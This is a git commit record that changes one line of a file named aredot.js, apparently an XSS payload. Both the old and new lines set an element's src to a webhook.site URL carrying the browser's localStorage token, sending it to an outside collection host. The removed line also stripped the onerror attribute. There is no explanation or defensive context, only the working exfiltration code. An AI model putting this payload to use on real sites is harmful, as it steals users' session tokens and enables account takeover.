52593380d7e1c2877cfb240d85d2d1c72d415382
Vlad Vasilkovsky <35891879+teraGL@users.noreply.github.com>
2023-01-27 13:40:56 +0200

    Update aredot.js

--- aredot.js
+++ aredot.js
@@ -1,1 +1,1 @@
-this.src='https://webhook.site/4212dabe-511b-4714-a146-d4d6e67549de/?x='+localStorage.getItem('token'); this.removeAttribute('onerror');
+this.src='https://webhook.site/4212dabe-511b-4714-a146-d4d6e67549de/?x='+localStorage.getItem('token');
